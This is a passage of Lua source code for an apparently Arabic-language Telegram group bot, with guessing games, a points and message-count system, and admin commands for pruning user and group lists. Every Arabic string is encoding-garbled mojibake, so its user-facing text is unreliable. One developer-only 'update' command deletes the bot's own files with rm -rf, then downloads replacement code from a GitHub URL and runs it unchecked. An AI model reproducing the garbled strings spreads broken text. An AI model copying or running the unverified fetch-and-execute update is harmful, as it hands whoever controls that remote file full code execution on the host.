name = string.gsub(name,"π§ββ","π§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββ")
name = string.gsub(name,"π§ββ","π§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββ")
name = string.gsub(name,"π§ββ","π§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββ")
name = string.gsub(name,"πββοΈ","πββοΈπββοΈπββοΈπββοΈπββοΈπββοΈπββοΈπββοΈπββοΈ")
name = string.gsub(name,"π§ββοΈ","π§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈ")
name = string.gsub(name,"π¬","π­π­π­π­π­π¬π­π­π­")
name = string.gsub(name,"π¨βπ¨βπ§","π¨βπ¨βπ¦π¨βπ¨βπ¦π¨βπ¨βπ¦π¨βπ¨βπ¦π¨βπ¨βπ§π¨βπ¨βπ¦π¨βπ¨β??")
name = string.gsub(name,"π","ππππππππππ")
name = string.gsub(name,"π€","π₯π₯π₯π₯π₯π€π₯π₯π₯")
name = string.gsub(name,"βοΈ","β³β³β³β³β³β³βοΈβ³β³")
name = string.gsub(name,"π","πππππππππ")
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ±Ψ³Ω Ψ§ΩΨ§Ψ?ΨͺΩΨ§Ω ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak::Set:Moktlf"..msg.chat_id_) or "").."" then 
if not database:get(bot_id.."Tshak:Set:Moktlf:Bot"..msg.chat_id_) then 
database:del(bot_id.."Tshak::Set:Moktlf"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nΩ­ ΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΩΩΨ?ΨͺΩΩ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1) 
end
database:set(bot_id.."Tshak:Set:Moktlf:Bot"..msg.chat_id_,true)
end
if text == "Ψ§ΩΨ«ΩΩ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
mthal = {"Ψ¬ΩΨ²","ΨΆΨ±Ψ§Ψ·Ω","Ψ§ΩΨ­Ψ¨Ω","Ψ§ΩΨ­Ψ§ΩΩ","Ψ΄ΩΨ±Ω","Ψ¨ΩΨ―Ω","Ψ³ΩΨ§ΩΩ","Ψ§ΩΩΨ?ΩΩ","Ψ§ΩΨ?ΩΩ","Ψ­Ψ―Ψ§Ψ―","Ψ§ΩΩΨ¨ΩΩ","ΩΨ±ΩΨ΅","ΩΨ±Ψ―","Ψ§ΩΨΉΩΨ¨","Ψ§ΩΨΉΩΩ","Ψ§ΩΨ?Ψ¨Ψ²","Ψ¨Ψ§ΩΨ­Ψ΅Ψ§Ψ―","Ψ΄ΩΨ±","Ψ΄ΩΩ","ΩΩΨ­ΩΩ",};
name = mthal[math.random(#mthal)]
database:set(bot_id.."Tshak:Set:Amth"..msg.chat_id_,name)
database:del(bot_id.."Tshak:Set:Amth:Bot"..msg.chat_id_)
name = string.gsub(name,"Ψ¬ΩΨ²","ΩΩΨ·Ω____ΩΩΩΨ§ΨΉΨ―Ω Ψ³ΩΩΩ")
name = string.gsub(name,"ΨΆΨ±Ψ§Ψ·Ω","Ψ§ΩΩ ΩΨ³ΩΩ Ψ§ΩΩΨ·Ω ΩΨͺΨ­ΩΩ___")
name = string.gsub(name,"Ψ¨ΩΨ―Ω","Ψ§ΩΩ___ΩΨ­Ψ― ΩΩΩΨ―Ω")
name = string.gsub(name,"Ψ§ΩΨ­Ψ§ΩΩ","ΨͺΨ¬Ψ―Ω ΩΩ___ΩΨΉΨ§Ω")
name = string.gsub(name,"Ψ΄ΩΨ±Ω","ΩΨΉ Ψ§ΩΨ?ΩΩ ΩΨ§___")
name = string.gsub(name,"Ψ§ΩΩΨ?ΩΩ","Ψ§ΩΨ·ΩΩ Ψ·ΩΩ___ΩΨ§ΩΨΉΩΩ ΨΉΩΩ Ψ§ΩΨ΅Ψ?ΩΨ©")
name = string.gsub(name,"Ψ³ΩΨ§ΩΩ","Ψ¨Ψ§ΩΩΨ¬Ω Ψ§ΩΨ±Ψ§ΩΨ© ΩΨ¨Ψ§ΩΨΈΩΨ±___")
name = string.gsub(name,"Ψ§ΩΨ?ΩΩ","ΩΩ ΩΩΨ©___Ψ΄Ψ―Ω ΨΉΩΩ Ψ§ΩΪΩΨ§Ψ¨ Ψ³Ψ±ΩΨ¬")
name = string.gsub(name,"Ψ­Ψ―Ψ§Ψ―","ΩΩΩΩ ΩΩ Ψ΅Ψ?Ω ΩΨ¬ΩΩ ΩΨ§Ω Ψ’ΩΩ___")
name = string.gsub(name,"Ψ§ΩΩΨ¨ΩΩ","___ΩΨ§ ΩΨ?Ψ§Ω ΩΩ Ψ§ΩΩΨ·Ψ±")
name = string.gsub(name,"Ψ§ΩΨ­Ψ¨Ω","Ψ§ΩΩΩ ΨͺΩΨ―ΨΊΨ© Ψ§ΩΨ­ΩΨ© ΩΨ?Ψ§Ω ΩΩ Ψ¬Ψ±Ψ©___")
name = string.gsub(name,"ΩΨ±ΩΨ΅","Ψ§ΩΩΨ§ΩΨΉΨ±Ω___ΩΩΩΩ Ψ§ΩΩΨ§ΨΉ ΨΉΩΨ¬Ω")
name = string.gsub(name,"Ψ§ΩΨΉΩΨ¨","Ψ§ΩΩΨ§ΩΩΩΨ­___ΩΩΩΩ Ψ­Ψ§ΩΨΆ")
name = string.gsub(name,"Ψ§ΩΨΉΩΩ","___Ψ₯Ψ°Ψ§ Ψ­Ψ¨Ψͺ Ψ§ΩΪΩΨ© Ψ§Ψ¨ΩΩΨ³ ΩΨ―Ψ?Ω Ψ§ΩΨ¬ΩΨ©")
name = string.gsub(name,"Ψ§ΩΨ?Ψ¨Ψ²","Ψ§ΩΨ·Ω___ΩΩΨ?Ψ¨Ψ§Ψ² Ψ­ΨͺΩ ΩΩ ΩΨ§ΩΩ ΩΨ΅Ω")
name = string.gsub(name,"Ψ¨Ψ§Ψ­Ψ΅Ψ§Ψ―","Ψ§Ψ³ΩΨ©___ΩΩΩΨ¬ΩΩ ΩΩΨ³ΩΨ±")
name = string.gsub(name,"Ψ΄ΩΨ±","Ψ§ΩΨ΄Ω__ΩΩΨ§ ΨͺΨΉΨ¨Ψ± ΩΩΨ±")
name = string.gsub(name,"Ψ΄ΩΩ","ΩΨ§ΩΩ ΨͺΨΉΨ¨ ΩΨ§ΩΩ__ΩΨ§ ΩΩ ΨΉΩΩ Ψ§ΩΨ­Ψ§ΨΆΨ± ΩΩΨ©")
name = string.gsub(name,"Ψ§ΩΩΨ±Ψ―","__Ψ¨ΨΉΩΩ Ψ§ΩΩ ΨΊΨ²Ψ§Ω")
name = string.gsub(name,"ΩΩΨ­ΩΩ","Ψ§Ψ¬Ω___ΨΉΩΨ§ΩΨ§")
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΩΩΩ Ψ§ΩΩΨ«Ω ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Set:Amth"..msg.chat_id_) or "").."" then 
if not database:get(bot_id.."Tshak:Set:Amth:Bot"..msg.chat_id_) then 
database:del(bot_id.."Tshak:Set:Amth"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nΩ­ ΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΩΨ«ΩΩ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1) 
end
database:set(bot_id.."Tshak:Set:Amth:Bot"..msg.chat_id_,true)
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨" and Manger(msg) then 
database:del(bot_id.."Tshak:Lock:Games"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"\nΩ­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨") 
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨" and Manger(msg) then 
database:set(bot_id.."Tshak:Lock:Games"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"\nΩ­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨") 
end
if text == 'Ψ§ΩΨ§ΩΨΉΨ§Ψ¨' then
Teext = [[
Ω­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ Ψ§ΩΩΩΨ¬ΩΨ―Ω
 Ω­ ΩΩΨ§ΩΨΉΨ§Ψ¨ Ψ§ΩΨ§Ψ­ΨͺΨ±Ψ§ΩΩΩ
Ω­ Ψ§ΩΨͺΨ¨ > Ψ§ΩΨΉΨ§Ψ¨ Ψ±ΩΩΩΨ±
β β β β β β β β β 
Ω­ Ψ¨Ψ§Ψͺ
Ω­ Ψ?ΩΩ
Ω­ Ψ§ΩΨ§Ψ³Ψ±ΨΉ
Ω­ Ψ³ΩΨ§ΩΩΨ§Ψͺ
Ω­ Ψ§ΩΩΨ?ΨͺΩΩ
Ω­ Ψ§ΩΨ«ΩΩ
Ω­ Ψ§ΩΨΉΩΨ³
Ω­ Ψ­Ψ²ΩΨ±Ω
Ω­ ΩΨΉΨ§ΩΩ
Ω­ ΨͺΩΩΨͺ
Ω­ Ψ§ΨΉΩΨ§Ω
Ω­ Ψ΅Ψ±Ψ§Ψ­Ω
Ω­ ΩΩ Ψ?ΩΨ±ΩΩ
Ω­ ΩΩΨ§ΩΨ§Ψͺ
Ω­ Ψ§ΩΨ¬ΩΩΨ²Ω
Ω­ Ψ±ΩΨ§ΨΆΩΨ§Ψͺ
Ω­ ΨͺΩΩΨͺ Ψ¨Ψ§ΩΨ΅ΩΨ±
β β β β β β β β β 
Ω­ ΩΩΨ§Ψ·Ω Β» ΩΨΉΨ±ΨΆ ΨΉΨ―Ψ― Ψ§ΩΨ§Ψ±Ψ¨Ψ§Ψ­
Ω­ Ψ¨ΩΨΉ ΩΩΨ§Ψ·Ω + Ψ§ΩΨΉΨ―Ψ― Β» ΩΨ³ΨͺΨ¨Ψ―Ψ§Ω ΩΩ ΩΨ¬ΩΩΨ±Ω Ψ¨50 Ψ±Ψ³Ψ§ΩΩ
]]
send(msg.chat_id_, msg.id_,Teext) 
end
if text == 'Ψ±Ψ³Ψ§Ψ¦ΩΩ' then
local nummsg = database:get(bot_id..'messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 1
local Text = 'Ω­ ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦ΩΩ ΩΩΨ§ *~ '..nummsg..'*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΩΨ³Ψ­ Ψ±Ψ³Ψ§Ψ¦ΩΩ' then
database:del(bot_id..'messageUser'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ±Ψ³Ψ§Ψ¦ΩΩ '
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ' or text == 'ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ' then
local edit = database:get(bot_id..'message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = 'Ω­ ΨΉΨ―Ψ― Ψ§ΩΨͺΨΉΨ―ΩΩΨ§Ψͺ ΩΩΨ§ *~ '..edit..'*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΩΨ³Ψ­ ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ' or text == 'ΩΨ³Ψ­ ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ' then
database:del(bot_id..'message_edit'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ '
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'Ψ¬ΩΨ§ΨͺΩ' then
local addmem = database:get(bot_id.."Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
local Text = 'Ω­ ΨΉΨ―Ψ― Ψ¬ΩΨ§ΨͺΩ Ψ§ΩΩΨΆΨ§ΩΩ ΩΩΨ§ *~ '..addmem..'*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΩΨ³Ψ­ Ψ¬ΩΨ§ΨͺΩ' then
database:del(bot_id..'Add:Memp'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ¬ΩΨ§ΨͺΩ Ψ§ΩΩΨΆΨ§ΩΩ '
send(msg.chat_id_, msg.id_,Text) 
end

if text == "ΩΩΨ§Ψ·Ω" then 
local Num = database:get(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = "Ω­ ΩΩ ΨͺΩΨΉΨ¨ Ψ§Ω ΩΨΉΨ¨Ω ΩΩΨ­Ψ΅ΩΩ ΨΉΩΩ Ψ¬ΩΨ§ΩΨ±"
else
Text = "Ω­ ΨΉΨ―Ψ― Ψ¬ΩΨ§ΩΨ± Ψ§ΩΨͺΩ Ψ±Ψ­Ψ¨ΨͺΩΨ§ ΩΩ *~ { "..Num.." } ΩΨ¬ΩΩΨ±Ω *"
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^Ψ¨ΩΨΉ ΩΩΨ§Ψ·Ω (%d+)$") then
local NUMPY = text:match("^Ψ¨ΩΨΉ ΩΩΨ§Ψ·Ω (%d+)$") 
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n*Ω­ ΩΨ§ Ψ§Ψ³ΨͺΨ·ΩΨΉ Ψ§ΩΨ¨ΩΨΉ Ψ§ΩΩ ΩΩ 1 *") 
return false 
end
if tonumber(database:get(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,"Ω­ ΩΩΨ³ ΩΨ―ΩΩ Ψ¬ΩΨ§ΩΨ± ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ \nΩ­ Ψ§Ψ°Ψ§ ΩΩΨͺ ΨͺΨ±ΩΨ― Ψ±Ψ¨Ψ­ Ψ§ΩΨ¬ΩΨ§ΩΨ± \nΩ­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ ΩΨ§Ψ¨Ψ―Ψ£ Ψ§ΩΩΨΉΨ¨ ! ") 
else
local NUM_GAMES = database:get(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,"\nΩ­ ΩΩΨ³ ΩΨ―ΩΩ Ψ¬ΩΨ§ΩΨ± Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΨΉΨ―Ψ― \nΩ­ ΩΨ²ΩΨ§Ψ―Ψ© ΩΩΨ§Ψ·Ω ΩΩ Ψ§ΩΩΨΉΨ¨Ω \nΩ­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ ΩΨ§Ψ¨Ψ―Ψ£ Ψ§ΩΩΨΉΨ¨ !") 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_,NUMPY) 
database:incrby(bot_id.."messageUser"..msg.chat_id_..":"..msg.sender_user_id_,NUMNKO) 
send(msg.chat_id_,msg.id_,"Ω­ ΨͺΩ Ψ?Ψ΅Ω *~ { "..NUMPY.." }* ΩΩ ΩΩΨ§Ψ·Ω \nΩ­ ΩΨͺΩ Ψ§ΨΆΨ§ΩΨ©* ~ { "..(NUMPY * 50).." } Ψ±Ψ³Ψ§ΩΩ Ψ§ΩΩ Ψ±Ψ³Ψ§ΩΩ *")
end 
return false 
end
if text ==("ΩΨ³Ψ­") and Admin(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_}) 
end 
if database:get(bot_id.."Tshak:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
database:del(bot_id.."Tshak:id:user"..msg.chat_id_) 
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ") 
database:del(bot_id.."Tshak:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
return false 
end 
database:del(bot_id.."Tshak:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id.."Tshak:id:user"..msg.chat_id_) 
database:del(bot_id.."Tshak:Msg_User"..msg.chat_id_..":"..msg.sender_user_id_) 
database:incrby(bot_id.."messageUser"..msg.chat_id_..":"..iduserr,numadded) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΨΆΨ§ΩΨ© ΩΩ {"..numadded.."} ΩΩ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω") 
end
if database:get(bot_id.."Tshak:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
database:del(bot_id.."Tshak:idgem:user"..msg.chat_id_) 
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ") 
database:del(bot_id.."Tshak:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
return false 
end 
database:del(bot_id.."Tshak:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id.."Tshak:idgem:user"..msg.chat_id_) 
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..iduserr,numadded) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΨΆΨ§ΩΨ© ΩΩ {"..numadded.."} ΩΩ Ψ§ΩΩΩΨ§Ψ·") 
end
------------------------------------------------------------
if text and text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$") and msg.reply_to_message_id_ == 0 and Creator(msg) then 
mahmoud = text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$")
database:set(bot_id.."Tshak:id:user"..msg.chat_id_,mahmoud) 
database:setex(bot_id.."Tshak:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true) 
send(msg.chat_id_, msg.id_, "ββΨ§Ψ±Ψ³Ω ΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΨ§Ω") 
return false
end
if text and text:match("^Ψ§ΨΆΩ ΩΩΨ§Ψ· (%d+)$") and msg.reply_to_message_id_ == 0 and Creator(msg) then 
mahmoud = text:match("^Ψ§ΨΆΩ ΩΩΨ§Ψ· (%d+)$")
database:set(bot_id.."Tshak:idgem:user"..msg.chat_id_,mahmoud) 
database:setex(bot_id.."Tshak:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true) 
send(msg.chat_id_, msg.id_, "Ω­ Ψ§Ψ±Ψ³Ω ΩΩ ΨΉΨ―Ψ― Ψ§ΩΩΩΨ§Ψ· Ψ§ΩΨ§Ω") 
return false
end
if text and text:match("^Ψ§ΨΆΩ ΩΩΨ§Ψ· (%d+)$") and msg.reply_to_message_id_ ~= 0 and Creator(msg) then
local Num = text:match("^Ψ§ΨΆΩ ΩΩΨ§Ψ· (%d+)$")
function reply(extra, result, success)
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..result.sender_user_id_,Num) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΨΆΨ§ΩΨ© ΩΩ {"..Num.."} ΩΩ Ψ§ΩΩΩΨ§Ψ·") 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text and text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$") and msg.reply_to_message_id_ ~= 0 and Creator(msg) then
local Num = text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$")
function reply(extra, result, success)
database:del(bot_id.."Tshak:Msg_User"..msg.chat_id_..":"..result.sender_user_id_) 
database:incrby(bot_id.."messageUser"..msg.chat_id_..":"..result.sender_user_id_,Num) 
send(msg.chat_id_, msg.id_, "\nΩ­ ΨͺΩ Ψ§ΨΆΨ§ΩΨ© ΩΩ {"..Num.."} ΩΩ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω") 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end

if text == "ΨͺΩΨΈΩΩ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ" and DevSonic(msg) then
local pv = database:smembers(bot_id..'UsersBot') 
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = { ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok" then
print('\27[30;33mΒ»Β» THE USER IS SAVE ME β\nΒ»Β» '..pv[i]..'\n\27[1;37m')
else
print('\27[30;31mΒ»Β» THE USER IS BLOCK ME β\nΒ»Β» '..pv[i]..'\n\27[1;37m')
database:srem(bot_id..'UsersBot',pv[i]) 
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ΄ΨͺΨ±ΩΩΩ ΩΩΩΩΩΩ') 
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'*Ω­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ψ§ΩΨ§Ω ~ '..#pv..'\nΩ­ ΨͺΩ Ψ§ΩΨΉΨ«ΩΨ± ΨΉΩΩ ~ '..sendok..' ΩΨ΄ΨͺΨ±Ω ΩΨ§Ω Ψ¨Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ\nΩ­ Ψ§Ψ΅Ψ¨Ψ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ψ§ΩΨ§Ω ~ '..ok..' ΩΨ΄ΨͺΨ±Ω *') 
end
end
end,nil)
end,nil)
end
return false
end
if text == "ΨͺΩΨΈΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨Ψ§Ψͺ" and DevSonic(msg) then
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34mΒ»Β» THE BOT IS NOT ADMIN β\nΒ»Β» '..group[i]..'\n\27[1;37m')
database:srem(bot_id..'Chek:Groups',group[i]) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i]) 
q = q + 1
print('\27[30;35mΒ»Β» THE BOT IS LEFT GROUP β\nΒ»Β» '..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i]) 
q = q + 1
print('\27[30;36mΒ»Β» THE BOT IS KICKED GROUP β\nΒ»Β» '..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΨͺΩΨ¬Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩΩΩΩ ') 
else
local mahmoud = (w + q)
local sendok = #group - mahmoud
if q == 0 then
mahmoud = ''
else
mahmoud = '\nΩ­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ~ '..q..' ΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩ Ψ§ΩΨ¨ΩΨͺ'
end
if w == 0 then
storm = ''
else
storm = '\nΩ­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ~'..w..' ΩΨ¬ΩΩΨΉΩ ΩΨ§Ω Ψ§ΩΨ¨ΩΨͺ ΨΉΨΆΩ'
end
send(msg.chat_id_, msg.id_,'*Ω­ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨ§Ω ~ '..#group..' ΩΨ¬ΩΩΨΉΩ '..storm..''..mahmoud..'\nΩ­ Ψ§Ψ΅Ψ¨Ψ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨ§Ω ~ '..sendok..' ΩΨ¬ΩΩΨΉΨ§Ψͺ*\n') 
end
end
end,nil)
end
return false
end
if text == ("ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³") and DevSonic(msg) then 
send(msg.chat_id_,msg.id_,'Ω­ ΨͺΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ«')
os.execute('rm -rf Tshake.lua')
os.execute('rm -rf start.lua')
download_to_file('https://raw.githubusercontent.com/MahmoudM5/sonic/master/Tshake.lua', 'Tshake.lua') 
download_to_file('https://raw.githubusercontent.com/MahmoudM5/sonic/master/start.lua', 'start.lua') 
dofile('Tshake.lua') 
return false
end


if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ' and DevSonic(msg) then 
database:del(bot_id..'Free:Add:Bots') 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ ') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ' and DevSonic(msg) then 
database:set(bot_id..'Free:Add:Bots',true) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ') 
end
if text and text:match("^ΨͺΨΉΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ (%d+)$") and DevSonic(msg) then
local Num = text:match("ΨͺΨΉΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ (%d+)$") 
database:set(bot_id..'Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΩΨΆΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ *~'..Num..'* ΨΉΨΆΩ')
end

if text == 'Ψ±ΩΨΉ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨ§Ψ­ΨͺΩΨ§Ψ·ΩΩ' and DevSonic(msg) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ' and DevBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups') 
local Users = database:scard(bot_id..'UsersBot') 
Text = '\nβ’ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ > {`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ' and DevBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups') 
local Users = database:scard(bot_id..'UsersBot') 
Text = '\n β’ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ > {`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text =='Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ' and DevBot(msg) then
local Groups = database:scard(bot_id..'Chek:Groups') 
local Users = database:scard(bot_id..'UsersBot') 
